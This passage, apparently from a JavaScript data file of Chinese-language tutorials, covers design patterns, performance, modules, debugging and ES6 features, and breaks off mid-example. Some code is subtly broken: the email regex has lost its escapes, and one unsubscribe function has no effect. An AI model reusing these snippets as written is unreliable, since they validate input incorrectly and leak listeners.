      // 记录日志
      this.logger.log('Payment processed', result);
      
      return result;
    } catch (error) {
      this.logger.error('Payment failed', error);
      throw error;
    }
  }
}

// 使用外观
const payment = new PaymentFacade();
await payment.processPayment({
  amount: 100,
  cardNumber: '4111111111111111',
  email: 'user@example.com',
});
\`\`\`

### 行为型模式

**观察者模式（Observer）：**
观察者模式定义对象间的一对多依赖关系，当一个对象状态改变时，所有依赖它的对象都会收到通知。在 JavaScript 中，观察者模式广泛应用于事件处理、数据绑定、状态管理等场景。现代前端框架如 React、Vue 都大量使用观察者模式。

\`\`\`javascript
// 观察者模式实现
class EventEmitter {
  constructor() {
    this.events = {};
  }
  
  on(event, callback) {
    if (!this.events[event]) {
      this.events[event] = [];
    }
    this.events[event].push(callback);
    return () => this.off(event, callback);
  }
  
  off(event, callback) {
    if (!this.events[event]) return;
    this.events[event] = this.events[event].filter(cb => cb !== callback);
  }
  
  emit(event, ...args) {
    if (!this.events[event]) return;
    this.events[event].forEach(callback => callback(...args));
  }
  
  once(event, callback) {
    const wrapper = (...args) => {
      callback(...args);
      this.off(event, wrapper);
    };
    this.on(event, wrapper);
  }
}

// 使用示例
const emitter = new EventEmitter();
const unsubscribe = emitter.on('user:login', (user) => {
  console.log(\`User \${user.name} logged in\`);
});

emitter.emit('user:login', { name: 'Alice' });
unsubscribe();

// 简化的发布订阅模式
class PubSub {
  constructor() {
    this.subscribers = {};
  }
  
  subscribe(event, callback) {
    if (!this.subscribers[event]) {
      this.subscribers[event] = [];
    }
    this.subscribers[event].push(callback);
    return () => {
      this.subscribers[event] = this.subscribers[event].filter(cb => cb !== callback);
    };
  }
  
  publish(event, data) {
    if (!this.subscribers[event]) return;
    this.subscribers[event].forEach(callback => callback(data));
  }
}

// 状态管理中的观察者模式
class Store {
  constructor(initialState) {
    this.state = initialState;
    this.listeners = [];
  }
  
  getState() {
    return this.state;
  }
  
  setState(newState) {
    this.state = { ...this.state, ...newState };
    this.listeners.forEach(listener => listener(this.state));
  }
  
  subscribe(listener) {
    this.listeners.push(listener);
    return () => {
      this.listeners = this.listeners.filter(l => l !== listener);
    };
  }
}
\`\`\`

**策略模式（Strategy）：**
策略模式定义一系列算法，把它们封装起来，并使它们可以相互替换。策略模式让算法独立于使用它的客户端而变化。在 JavaScript 中，策略模式常用于表单验证、动画效果、支付方式选择等场景。

\`\`\`javascript
// 策略模式实现
const validationStrategies = {
  required: (value) => {
    if (!value || value.trim() === '') {
      return 'This field is required';
    }
    return null;
  },
  
  email: (value) => {
    if (!/^[^s@]+@[^s@]+.[^s@]+$/.test(value)) {
      return 'Please enter a valid email';
    }
    return null;
  },
  
  minLength: (value, min) => {
    if (value.length < min) {
      return \`Minimum length is \${min} characters\`;
    }
    return null;
  },
  
  maxLength: (value, max) => {
    if (value.length > max) {
      return \`Maximum length is \${max} characters\`;
    }
    return null;
  },
};

class Validator {
  constructor() {
    this.rules = [];
  }
  
  addRule(field, strategy, ...args) {
    this.rules.push({ field, strategy, args });
    return this;
  }
  
  validate(data) {
    const errors = {};
    
    for (const rule of this.rules) {
      const { field, strategy, args } = rule;
      const value = data[field];
      const error = validationStrategies[strategy](value, ...args);
      
      if (error && !errors[field]) {
        errors[field] = error;
      }
    }
    
    return {
      isValid: Object.keys(errors).length === 0,
      errors,
    };
  }
}

// 使用示例
const validator = new Validator()
  .addRule('email', 'required')
  .addRule('email', 'email')
  .addRule('password', 'required')
  .addRule('password', 'minLength', 8);

const result = validator.validate({
  email: 'invalid-email',
  password: '123',
});

// 支付策略
const paymentStrategies = {
  creditCard: (amount, cardInfo) => {
    console.log(\`Processing credit card payment of $\${amount}\`);
    // 信用卡支付逻辑
  },
  
  paypal: (amount, paypalInfo) => {
    console.log(\`Processing PayPal payment of $\${amount}\`);
    // PayPal 支付逻辑
  },
  
  crypto: (amount, walletInfo) => {
    console.log(\`Processing crypto payment of $\${amount}\`);
    // 加密货币支付逻辑
  },
};

function processPayment(method, amount, info) {
  const strategy = paymentStrategies[method];
  if (!strategy) {
    throw new Error(\`Unknown payment method: \${method}\`);
  }
  return strategy(amount, info);
}
\`\`\`

**命令模式（Command）：**
命令模式将请求封装为对象，从而允许用不同的请求对客户进行参数化、对请求排队或记录请求日志，以及支持可撤销的操作。在 JavaScript 中，命令模式常用于实现撤销/重做功能、菜单操作、宏命令等场景。

\`\`\`javascript
// 命令模式实现
class Command {
  execute() {
    throw new Error('Execute method must be implemented');
  }
  
  undo() {
    throw new Error('Undo method must be implemented');
  }
}

class AddItemCommand extends Command {
  constructor(list, item) {
    super();
    this.list = list;
    this.item = item;
    this.index = null;
  }
  
  execute() {
    this.index = this.list.length;
    this.list.push(this.item);
  }
  
  undo() {
    if (this.index !== null) {
      this.list.splice(this.index, 1);
    }
  }
}

class RemoveItemCommand extends Command {
  constructor(list, index) {
    super();
    this.list = list;
    this.index = index;
    this.item = null;
  }
  
  execute() {
    this.item = this.list[this.index];
    this.list.splice(this.index, 1);
  }
  
  undo() {
    if (this.item !== null) {
      this.list.splice(this.index, 0, this.item);
    }
  }
}

// 命令管理器（支持撤销/重做）
class CommandManager {
  constructor() {
    this.history = [];
    this.redoStack = [];
  }
  
  execute(command) {
    command.execute();
    this.history.push(command);
    this.redoStack = [];
  }
  
  undo() {
    const command = this.history.pop();
    if (command) {
      command.undo();
      this.redoStack.push(command);
    }
  }
  
  redo() {
    const command = this.redoStack.pop();
    if (command) {
      command.execute();
      this.history.push(command);
    }
  }
}

// 使用示例
const list = [];
const manager = new CommandManager();

manager.execute(new AddItemCommand(list, 'Item 1'));
manager.execute(new AddItemCommand(list, 'Item 2'));
console.log(list); // ['Item 1', 'Item 2']

manager.undo();
console.log(list); // ['Item 1']

manager.redo();
console.log(list); // ['Item 1', 'Item 2']
\`\`\`

**迭代器模式（Iterator）：**
迭代器模式提供一种方法顺序访问一个聚合对象中的各个元素，而又不暴露该对象的内部表示。JavaScript 原生支持迭代器协议，通过 Symbol.iterator 实现自定义迭代器。迭代器模式常用于遍历复杂数据结构、实现懒加载等场景。

\`\`\`javascript
// 自定义迭代器
class RangeIterator {
  constructor(start, end, step = 1) {
    this.start = start;
    this.end = end;
    this.step = step;
    this.current = start;
  }
  
  [Symbol.iterator]() {
    return this;
  }
  
  next() {
    if (this.current < this.end) {
      const value = this.current;
      this.current += this.step;
      return { value, done: false };
    }
    return { value: undefined, done: true };
  }
}

const range = new RangeIterator(0, 10, 2);
for (const num of range) {
  console.log(num); // 0, 2, 4, 6, 8
}

// 树形结构迭代器
class TreeIterator {
  constructor(root) {
    this.stack = [root];
  }
  
  [Symbol.iterator]() {
    return this;
  }
  
  next() {
    if (this.stack.length === 0) {
      return { done: true };
    }
    
    const node = this.stack.pop();
    
    if (node.children) {
      for (let i = node.children.length - 1; i >= 0; i--) {
        this.stack.push(node.children[i]);
      }
    }
    
    return { value: node, done: false };
  }
}

// 生成器函数实现迭代器
function* fibonacci(limit) {
  let [prev, curr] = [0, 1];
  while (curr <= limit) {
    yield curr;
    [prev, curr] = [curr, prev + curr];
  }
}

for (const num of fibonacci(100)) {
  console.log(num); // 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89
}
\`\`\`

**状态模式（State）：**
状态模式允许一个对象在其内部状态改变时改变它的行为。对象看起来好像修改了它的类。状态模式将状态逻辑分散到不同的状态类中，避免大量的条件判断。在 JavaScript 中，状态模式常用于实现状态机、游戏角色状态、订单状态等场景。

\`\`\`javascript
// 状态模式实现
class TrafficLight {
  constructor() {
    this.state = new RedState(this);
  }
  
  changeState(state) {
    this.state = state;
  }
  
  next() {
    this.state.next();
  }
  
  report() {
    this.state.report();
  }
}

class RedState {
  constructor(light) {
    this.light = light;
  }
  
  next() {
    console.log('Red -> Green');
    this.light.changeState(new GreenState(this.light));
  }
  
  report() {
    console.log('Traffic light is RED - STOP');
  }
}

class GreenState {
  constructor(light) {
    this.light = light;
  }
  
  next() {
    console.log('Green -> Yellow');
    this.light.changeState(new YellowState(this.light));
  }
  
  report() {
    console.log('Traffic light is GREEN - GO');
  }
}

class YellowState {
  constructor(light) {
    this.light = light;
  }
  
  next() {
    console.log('Yellow -> Red');
    this.light.changeState(new RedState(this.light));
  }
  
  report() {
    console.log('Traffic light is YELLOW - CAUTION');
  }
}

// 使用示例
const trafficLight = new TrafficLight();
trafficLight.report(); // Traffic light is RED - STOP
trafficLight.next();   // Red -> Green
trafficLight.report(); // Traffic light is GREEN - GO

// 订单状态机
const OrderState = {
  PENDING: 'pending',
  CONFIRMED: 'confirmed',
  SHIPPED: 'shipped',
  DELIVERED: 'delivered',
  CANCELLED: 'cancelled',
};

const transitions = {
  [OrderState.PENDING]: [OrderState.CONFIRMED, OrderState.CANCELLED],
  [OrderState.CONFIRMED]: [OrderState.SHIPPED, OrderState.CANCELLED],
  [OrderState.SHIPPED]: [OrderState.DELIVERED],
  [OrderState.DELIVERED]: [],
  [OrderState.CANCELLED]: [],
};

function canTransition(from, to) {
  return transitions[from]?.includes(to) ?? false;
}
\`\`\`

### 应用场景

**单页应用架构中的设计模式：**
- 路由管理：观察者模式实现路由变化监听和页面切换
- 状态管理：单例模式确保全局状态唯一性，观察者模式实现状态订阅
- 组件通信：发布-订阅模式实现跨组件通信，避免紧耦合

\`\`\`javascript
// 路由管理器（观察者模式）
class Router {
  constructor() {
    this.routes = {};
    this.currentRoute = null;
    this.listeners = [];
  }
  
  register(path, handler) {
    this.routes[path] = handler;
  }
  
  navigate(path) {
    if (this.routes[path]) {
      this.currentRoute = path;
      this.routes[path]();
      this.listeners.forEach(listener => listener(path));
    }
  }
  
  subscribe(listener) {
    this.listeners.push(listener);
    return () => {
      this.listeners = this.listeners.filter(l => l !== listener);
    };
  }
}

// 全局状态管理（单例 + 观察者）
class AppState {
  static instance = null;
  
  constructor() {
    if (AppState.instance) return AppState.instance;
    AppState.instance = this;
    this.state = {};
    this.listeners = [];
  }
  
  setState(newState) {
    this.state = { ...this.state, ...newState };
    this.listeners.forEach(l => l(this.state));
  }
  
  subscribe(listener) {
    this.listeners.push(listener);
    return () => this.listeners.filter(l => l !== listener);
  }
}
\`\`\`

**表单验证中的设计模式：**
- 策略模式：不同的验证规则作为策略，灵活组合
- 装饰器模式：动态添加验证功能，如实时验证、异步验证
- 责任链模式：多个验证器按顺序执行

\`\`\`javascript
// 表单验证器（策略 + 责任链）
class FormValidator {
  constructor() {
    this.strategies = {};
    this.chain = [];
  }
  
  addStrategy(name, fn) {
    this.strategies[name] = fn;
    return this;
  }
  
  addRule(field, strategyName, ...args) {
    this.chain.push({ field, strategy: strategyName, args });
    return this;
  }
  
  validate(data) {
    const errors = {};
    
    for (const rule of this.chain) {
      const strategy = this.strategies[rule.strategy];
      if (strategy) {
        const error = strategy(data[rule.field], ...rule.args);
        if (error && !errors[rule.field]) {
          errors[rule.field] = error;
        }
      }
    }
    
    return { isValid: Object.keys(errors).length === 0, errors };
  }
}

const validator = new FormValidator()
  .addStrategy('required', v => v ? null : 'Required')
  .addStrategy('email', v => /^[^s@]+@[^s@]+.[^s@]+$/.test(v) ? null : 'Invalid email')
  .addRule('email', 'required')
  .addRule('email', 'email');
\`\`\`

**API 调用中的设计模式：**
- 代理模式：拦截请求和响应，添加缓存、日志等功能
- 适配器模式：适配不同的 API 格式，统一接口
- 装饰器模式：添加重试、超时、认证等功能

\`\`\`javascript
// API 客户端（代理 + 装饰器）
class APIClient {
  constructor(baseURL) {
    this.baseURL = baseURL;
    this.cache = new Map();
    this.interceptors = { request: [], response: [] };
  }
  
  addRequestInterceptor(fn) {
    this.interceptors.request.push(fn);
  }
  
  addResponseInterceptor(fn) {
    this.interceptors.response.push(fn);
  }
  
  async request(endpoint, options = {}) {
    let url = this.baseURL + endpoint;
    let config = options;
    
    // 执行请求拦截器
    for (const interceptor of this.interceptors.request) {
      [url, config] = await interceptor(url, config);
    }
    
    const cacheKey = JSON.stringify({ url, config });
    if (config.cache && this.cache.has(cacheKey)) {
      return this.cache.get(cacheKey);
    }
    
    let response = await fetch(url, config);
    
    // 执行响应拦截器
    for (const interceptor of this.interceptors.response) {
      response = await interceptor(response);
    }
    
    const data = await response.json();
    
    if (config.cache) {
      this.cache.set(cacheKey, data);
    }
    
    return data;
  }
}

const api = new APIClient('https://api.example.com');
api.addRequestInterceptor((url, config) => {
  config.headers = { ...config.headers, Authorization: 'Bearer token' };
  return [url, config];
});
\`\`\`

**动画效果中的设计模式：**
- 策略模式：不同的动画算法（缓动函数）作为策略
- 命令模式：将动画操作封装为命令，支持撤销和队列
- 观察者模式：动画状态变化通知订阅者

\`\`\`javascript
// 动画管理器（策略 + 命令）
const easingStrategies = {
  linear: t => t,
  easeIn: t => t * t,
  easeOut: t => t * (2 - t),
  easeInOut: t => t < 0.5 ? 2 * t * t : -1 + (4 - 2 * t) * t,
};

class Animation {
  constructor(element, property, start, end, duration, easing = 'linear') {
    this.element = element;
    this.property = property;
    this.start = start;
    this.end = end;
    this.duration = duration;
    this.easing = easingStrategies[easing];
    this.startTime = null;
  }
  
  execute() {
    this.startTime = performance.now();
    this.tick();
  }
  
  tick() {
    const elapsed = performance.now() - this.startTime;
    const progress = Math.min(elapsed / this.duration, 1);
    const easedProgress = this.easing(progress);
    const value = this.start + (this.end - this.start) * easedProgress;
    
    this.element.style[this.property] = value + 'px';
    
    if (progress < 1) {
      requestAnimationFrame(() => this.tick());
    }
  }
}
\`\`\`

### 最佳实践

**设计模式使用原则：**
- 理解设计模式的意图和适用场景，避免为了使用模式而使用模式
- 选择适合的设计模式，根据具体问题选择最合适的解决方案
- 避免过度设计，简单问题用简单方案解决
- 结合 JavaScript 的特性，利用闭包、原型链、高阶函数等特性简化实现

\`\`\`javascript
// 过度设计的例子
class SingletonFactoryBuilder {
  // 不必要的复杂性
}

// 简洁的实现
const singleton = {
  instance: null,
  getInstance() {
    if (!this.instance) {
      this.instance = { data: {} };
    }
    return this.instance;
  },
};
\`\`\`

**代码组织与可维护性：**
- 保持代码简洁，设计模式应该简化代码而不是增加复杂性
- 注重可维护性，代码应该易于理解和修改
- 学习设计模式的变体，根据实际需求灵活调整
- 实践中积累经验，在真实项目中应用和体会设计模式

\`\`\`javascript
// 模块化组织设计模式
// patterns/observer.js
export class EventEmitter { /* ... */ }

// patterns/strategy.js
export const strategies = { /* ... */ }

// patterns/factory.js
export class Factory { /* ... */ }

// 使用
import { EventEmitter } from './patterns/observer';
import { strategies } from './patterns/strategy';
\`\`\`

**性能考虑：**
- 观察者模式中注意内存泄漏，及时取消订阅
- 代理模式中注意性能开销，避免过度拦截
- 迭代器模式中注意内存使用，大数据集使用生成器

\`\`\`javascript
// 避免内存泄漏
class Component {
  constructor() {
    this.unsubscribe = store.subscribe(this.handleChange);
  }
  
  handleChange = (state) => {
    // 处理状态变化
  }
  
  destroy() {
    // 清理订阅
    this.unsubscribe();
  }
}

// 使用 WeakMap 避免内存泄漏
const privateData = new WeakMap();

class MyClass {
  constructor() {
    privateData.set(this, { secret: 'value' });
  }
  
  getSecret() {
    return privateData.get(this).secret;
  }
}
\`\`\`

**测试设计模式：**
- 单元测试每个模式的核心功能
- 测试模式的边界情况
- 测试模式之间的交互

\`\`\`javascript
// 测试观察者模式
describe('EventEmitter', () => {
  it('should call listeners when event is emitted', () => {
    const emitter = new EventEmitter();
    const listener = jest.fn();
    
    emitter.on('test', listener);
    emitter.emit('test', 'data');
    
    expect(listener).toHaveBeenCalledWith('data');
  });
  
  it('should unsubscribe correctly', () => {
    const emitter = new EventEmitter();
    const listener = jest.fn();
    
    const unsubscribe = emitter.on('test', listener);
    unsubscribe();
    emitter.emit('test', 'data');
    
    expect(listener).not.toHaveBeenCalled();
  });
});
\`\`\``,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-performance",title:"JavaScript 性能优化最佳实践",category:"javascript",difficulty:"medium",tags:["JavaScript","性能优化","内存","执行速度"],content:`## JavaScript 性能优化最佳实践

JavaScript 性能直接影响应用的用户体验。一个高性能的 JavaScript 应用应该具备快速响应、流畅动画、低内存占用等特点。性能优化是一个持续的过程，需要在开发的各个阶段关注。以下是一些关键的性能优化策略，涵盖代码优化、内存管理、异步处理、DOM 操作等多个方面。

### 代码优化

**变量声明与作用域：**
- 使用 let 和 const 代替 var，利用块级作用域避免变量提升问题
- 减少全局变量的使用，全局变量会污染全局命名空间，增加查找时间
- 合理使用闭包，闭包会保持对外部变量的引用，可能导致内存泄漏

\`\`\`javascript
// ❌ 避免：全局变量污染
var globalVar = 'global';

// ✅ 推荐：使用模块作用域
const Module = (() => {
  const privateVar = 'private';
  return {
    getPrivate: () => privateVar,
  };
})();

// ❌ 避免：闭包导致的内存问题
function createHandlers() {
  const handlers = [];
  for (var i = 0; i < 10; i++) {
    handlers.push(function() {
      console.log(i); // 所有函数都输出 10
    });
  }
  return handlers;
}

// ✅ 推荐：使用 let 或 IIFE
function createHandlers() {
  const handlers = [];
  for (let i = 0; i < 10; i++) {
    handlers.push(() => console.log(i)); // 输出 0-9
  }
  return handlers;
}
\`\`\`

**函数优化：**
- 避免在循环中定义函数，每次迭代都会创建新的函数对象
- 使用箭头函数简化代码，但注意 this 绑定问题
- 合理使用函数柯里化，实现函数复用和延迟计算

\`\`\`javascript
// ❌ 避免：循环中创建函数
const handlers = [];
for (let i = 0; i < 1000; i++) {
  handlers.push(function() {
    return i * 2;
  });
}

// ✅ 推荐：提取函数
const double = (i) => i * 2;
const handlers = [];
for (let i = 0; i < 1000; i++) {
  handlers.push(() => double(i));
}

// 函数柯里化优化
const curry = (fn) => {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args);
    }
    return (...moreArgs) => curried.apply(this, args.concat(moreArgs));
  };
};

const add = (a, b, c) => a + b + c;
const curriedAdd = curry(add);
const add5 = curriedAdd(5); // 部分应用，复用函数
\`\`\`

**循环优化：**
- 使用 for 循环代替 forEach，for 循环性能更好
- 缓存数组长度，避免每次迭代都计算
- 避免在循环中进行 DOM 操作，使用 DocumentFragment 批量操作

\`\`\`javascript
// ❌ 避免：每次迭代都计算长度
for (let i = 0; i < array.length; i++) {
  // ...
}

// ✅ 推荐：缓存数组长度
for (let i = 0, len = array.length; i < len; i++) {
  // ...
}

// ❌ 避免：循环中进行 DOM 操作
for (let i = 0; i < items.length; i++) {
  const li = document.createElement('li');
  li.textContent = items[i];
  list.appendChild(li); // 每次都触发重排
}

// ✅ 推荐：使用 DocumentFragment
const fragment = document.createDocumentFragment();
for (let i = 0; i < items.length; i++) {
  const li = document.createElement('li');
  li.textContent = items[i];
  fragment.appendChild(li);
}
list.appendChild(fragment); // 只触发一次重排
\`\`\`

**条件优化：**
- 使用 switch 代替多个 if-else，switch 使用跳转表优化
- 将最常见的条件放在前面，减少判断次数
- 使用对象字面量代替条件判断，提高可读性和性能

\`\`\`javascript
// ❌ 避免：多个 if-else
function getStatus(status) {
  if (status === 'pending') return '等待中';
  else if (status === 'processing') return '处理中';
  else if (status === 'completed') return '已完成';
  else if (status === 'failed') return '失败';
  else return '未知';
}

// ✅ 推荐：使用对象字面量
const statusMap = {
  pending: '等待中',
  processing: '处理中',
  completed: '已完成',
  failed: '失败',
};

function getStatus(status) {
  return statusMap[status] || '未知';
}

// ✅ 推荐：使用 Map（更高效）
const statusMap = new Map([
  ['pending', '等待中'],
  ['processing', '处理中'],
  ['completed', '已完成'],
  ['failed', '失败'],
]);
\`\`\`

### 内存管理

**内存泄漏常见原因与预防：**
- 避免循环引用，特别是 DOM 元素与 JavaScript 对象之间的引用
- 清理定时器和事件监听器，组件销毁时必须清理
- 释放不再使用的对象引用，帮助垃圾回收器回收内存

\`\`\`javascript
// ❌ 避免：未清理的定时器
class Component {
  constructor() {
    this.timer = setInterval(() => {
      this.updateData();
    }, 1000);
  }
  // 缺少清理逻辑
}

// ✅ 推荐：正确清理
class Component {
  constructor() {
    this.timer = setInterval(() => {
      this.updateData();
    }, 1000);
  }
  
  destroy() {
    clearInterval(this.timer);
  }
}

// ❌ 避免：未移除的事件监听器
class Modal {
  constructor() {
    document.addEventListener('keydown', this.handleKeydown);
  }
}

// ✅ 推荐：正确移除监听器
class Modal {
  constructor() {
    this.handleKeydown = this.handleKeydown.bind(this);
    document.addEventListener('keydown', this.handleKeydown);
  }
  
  destroy() {
    document.removeEventListener('keydown', this.handleKeydown);
  }
}

// ❌ 避免：闭包持有大对象引用
function createProcessor(largeData) {
  return function process() {
    // 即使只用一部分数据，整个 largeData 都被引用
    return largeData[0];
  };
}

// ✅ 推荐：只保留需要的数据
function createProcessor(largeData) {
  const neededData = largeData[0];
  return function process() {
    return neededData;
  };
}
\`\`\`

**垃圾回收机制理解：**
- JavaScript 使用标记清除算法进行垃圾回收
- 避免创建过多的临时对象，减少 GC 压力
- 使用 WeakMap 和 WeakSet 存储对象引用，不阻止垃圾回收

\`\`\`javascript
// WeakMap 示例：不阻止垃圾回收
const privateData = new WeakMap();

class MyClass {
  constructor() {
    privateData.set(this, { secret: 'value' });
  }
  
  getSecret() {
    return privateData.get(this)?.secret;
  }
}

// 当 MyClass 实例被销毁时，WeakMap 中的数据也会被回收

// WeakSet 示例：跟踪对象而不阻止回收
const visitedObjects = new WeakSet();

function processObject(obj) {
  if (visitedObjects.has(obj)) {
    return; // 已处理过
  }
  visitedObjects.add(obj);
  // 处理对象
}
\`\`\`

**内存优化技巧：**
- 使用对象池复用对象，减少对象创建和销毁的开销
- 合理使用缓存，但要注意缓存大小和过期策略
- 减少内存分配，重用数组和对象

\`\`\`javascript
// 对象池模式
class ObjectPool {
  constructor(factory, initialSize = 10) {
    this.factory = factory;
    this.pool = [];
    for (let i = 0; i < initialSize; i++) {
      this.pool.push(factory());
    }
  }
  
  acquire() {
    return this.pool.length > 0 ? this.pool.pop() : this.factory();
  }
  
  release(obj) {
    // 重置对象状态
    Object.keys(obj).forEach(key => delete obj[key]);
    this.pool.push(obj);
  }
}

// 使用示例
const vectorPool = new ObjectPool(() => ({ x: 0, y: 0, z: 0 }));

function calculate() {
  const v = vectorPool.acquire();
  // 使用 v 进行计算
  vectorPool.release(v);
}

// 数组复用
const tempArray = [];
function processItems(items) {
  tempArray.length = 0; // 清空但保留内存
  for (const item of items) {
    if (item.active) {
      tempArray.push(item);
    }
  }
  return tempArray;
}
\`\`\`

### 异步优化

**异步操作：**
- 使用 Promise 和 async/await
- 避免回调地狱
- 合理控制并发数量

**网络请求：**
- 合并请求
- 使用缓存
- 实现请求节流

**资源加载：**
- 延迟加载非关键资源
- 预加载关键资源
- 使用 CDN

### 浏览器优化

**DOM 操作：**
- 减少 DOM 操作次数
- 使用 DocumentFragment
- 批量更新 DOM

**事件处理：**
- 使用事件委托
- 避免过多的事件监听器
- 清理事件监听器

**渲染优化：**
- 避免重排和重绘
- 使用 CSS 动画代替 JavaScript 动画
- 合理使用 requestAnimationFrame

### 工具和监控

**性能分析：**
- 使用 Chrome DevTools
- 分析执行时间
- 识别性能瓶颈

**监控工具：**
- Lighthouse
- Web Vitals
- 自定义性能监控

**构建优化：**
- 代码压缩
- 代码分割
-  tree-shaking

### 最佳实践

- 编写高效的算法
- 合理使用数据结构
- 避免不必要的计算
- 优化关键路径
- 定期性能测试
- 持续优化
- 学习性能优化技巧
- 关注性能最佳实践`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-modules",title:"JavaScript 模块化开发与实践",category:"javascript",difficulty:"medium",tags:["JavaScript","模块化","ES modules","CommonJS"],content:`## JavaScript 模块化开发与实践

模块化是现代 JavaScript 开发的重要特性，它使代码更加组织化、可维护和可复用。

### 模块化的演进

**全局变量：**
- 最早的模块化方式
- 容易导致命名冲突
- 代码难以维护

**IIFE (立即执行函数表达式)：**
- 创建私有作用域
- 避免全局变量污染
- 支持模块模式

**CommonJS：**
- Node.js 的模块系统
- 使用 require() 和 module.exports
- 同步加载模块

**AMD (Asynchronous Module Definition)：**
- 异步加载模块
- 使用 define() 和 require()
- 适合浏览器环境

**ES modules：**
- ECMAScript 标准模块系统
- 使用 import 和 export
- 支持静态分析
- 浏览器和 Node.js 都支持

### ES modules 核心特性

**导出：**
- 命名导出：export const name = value;
- 默认导出：export default value;
- 重导出：export { name } from './module';

**导入：**
- 命名导入：import { name } from './module';
- 默认导入：import name from './module';
- 命名空间导入：import * as module from './module';
- 动态导入：import('./module').then(module => {});

**模块解析：**
- 相对路径：./module
- 绝对路径：/module
- 裸模块：module

### 模块化工具

**打包工具：**
- Webpack：功能丰富，生态完整
- Rollup：适合库打包，Tree-shaking 效果好：Rollup是JavaScript模块打包器，专注于库打包，输出代码简洁高效，Tree-shaking效果优秀，可以自动移除未使用的代码，Rollup使用ES模块格式，支持插件系统，是许多前端框架（如Vue、React）底层使用的打包工具
- Vite：快速的开发服务器，适合现代前端：Vite是新一代前端构建工具，利用ES模块原生支持实现极速的冷启动和热更新，开发体验极佳，支持TypeScript、CSS预处理器、各种框架模板，Vite使用Rollup进行生产构建，生态丰富，是现代前端项目的首选构建工具

**构建工具：**
- Babel：转译 ES6+ 代码：Babel是JavaScript编译器，用于将ES6+、TypeScript、JSX等现代JavaScript语法转换为浏览器兼容的ES5代码，Babel通过插件系统支持各种语法转换和polyfill，是现代前端开发的基础工具，支持React、Vue等框架的JSX语法
- TypeScript：类型检查和转译
- SWC：快速的 JavaScript/TypeScript 编译器

**包管理器：**
- npm：Node.js 官方包管理器
- yarn：Facebook 开发的包管理器
- pnpm：快速的包管理器，节省磁盘空间

### 模块化最佳实践

**模块设计：**
- 单一职责原则
- 合理的模块大小
- 清晰的模块接口

**命名规范：**
- 文件名使用小写和连字符
- 模块名与文件名保持一致
- 避免使用保留字

**依赖管理：**
- 明确的依赖关系
- 避免循环依赖
- 合理使用 peer dependencies

**代码组织：**
- 按功能组织模块
- 公共模块与业务模块分离
- 建立清晰的目录结构

**测试：**
- 模块化测试
- 单元测试
- 集成测试

### 实际应用

**前端应用：**
- 组件模块化
- 工具函数模块化
- 状态管理模块化

**Node.js 应用：**
- 路由模块化
- 中间件模块化
- 服务模块化

**库开发：**
- 核心功能模块化
- 插件系统
- 按需导入`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-debugging",title:"JavaScript 调试技巧与最佳实践",category:"javascript",difficulty:"medium",tags:["JavaScript","调试","DevTools","错误处理"],content:`## JavaScript 调试技巧与最佳实践

调试是开发过程中的重要环节，掌握有效的调试技巧可以提高开发效率和代码质量。

### 调试工具

**Chrome DevTools：**
- 控制台 (Console)：输出日志和错误
- 源码 (Sources)：查看和调试代码
- 网络 (Network)：分析网络请求
- 性能 (Performance)：分析性能
- 内存 (Memory)：分析内存使用
- 应用 (Application)：查看存储和缓存

**Node.js 调试：**
- 使用 --inspect 标志
- Chrome DevTools 连接
- VS Code 调试器

**其他调试工具：**
- VS Code 调试器
- WebStorm 调试器
- 第三方调试库

### 调试技巧

**控制台调试：**
- console.log()：基本日志
- console.warn()：警告信息
- console.error()：错误信息
- console.table()：表格形式展示数据
- console.time()：测量执行时间
- console.trace()：显示调用栈

**断点调试：**
- 行断点：在特定行设置
- 条件断点：满足条件时触发
- 日志断点：不暂停执行，只输出日志
- 异常断点：捕获异常时触发
- DOM 断点：DOM 变化时触发

**网络调试：**
- 查看请求和响应
- 分析请求头和响应头
- 模拟网络条件
- 阻止请求
- 重放请求

**性能调试：**
- 分析执行时间
- 识别瓶颈
- 内存泄漏检测
- 垃圾回收分析

### 错误处理

**错误类型：**
- 语法错误：代码语法错误
- 运行时错误：执行时发生的错误
- 逻辑错误：代码逻辑不正确

**错误处理策略：**
- try/catch：捕获同步错误
- Promise.catch()：捕获异步错误
- window.onerror：全局错误处理
- unhandledrejection：未处理的 Promise 拒绝

**错误监控：**
- 自定义错误监控
- Sentry 等错误监控服务
- 日志收集

### 调试最佳实践

**代码组织：**
- 模块化代码
- 清晰的函数和变量命名
- 适当的注释

**调试流程：**
- 重现问题
- 定位问题
- 分析原因
- 修复问题
- 验证修复

**预防性措施：**
- 单元测试
- 类型检查
- 代码审查
- 静态分析

**调试技巧：**
- 简化问题
- 隔离测试
- 逐步调试
- 记录状态
- 利用版本控制

**团队协作：**
- 统一的调试工具和流程
- 共享调试经验
- 文档化常见问题

### 实际应用

**前端调试：**
- DOM 操作调试
- 事件处理调试
- 异步操作调试
- 性能问题调试

**Node.js 调试：**
- 服务器端调试
- API 调试
- 数据库操作调试
- 中间件调试

**生产环境调试：**
- 日志分析
- 错误监控
- A/B 测试
- 用户行为分析`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-ecmascript",title:"ECMAScript 新特性与最佳实践",category:"javascript",difficulty:"medium",tags:["JavaScript","ES6+","新特性","语法"],content:`## ECMAScript 新特性与最佳实践

ECMAScript 标准不断演进，每年都会发布新版本，带来许多新特性和语法糖。这些新特性不仅提高了开发效率和代码质量，还让 JavaScript 代码更加简洁、可读、可维护。理解并掌握这些新特性对于现代 JavaScript 开发至关重要。

### ES6 (ES2015) 核心特性

**let 和 const 声明：**
ES6 引入了 let 和 const 关键字，解决了 var 声明的变量提升和函数作用域问题。let 声明的变量具有块级作用域，const 声明的变量是常量，不可重新赋值。使用 let 和 const 可以避免很多常见的错误，提高代码的可预测性。

\`\`\`javascript
// var 的问题
console.log(a); // undefined（变量提升）
var a = 10;

for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);
}
// 输出: 3, 3, 3（函数作用域问题）

// let 解决变量提升
console.log(b); // ReferenceError
let b = 10;

// let 解决循环问题
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);
}
// 输出: 0, 1, 2（块级作用域）

// const 常量
const PI = 3.14159;
// PI = 3.14; // TypeError

// const 对象属性可修改
const user = { name: 'Alice' };
user.name = 'Bob'; // OK
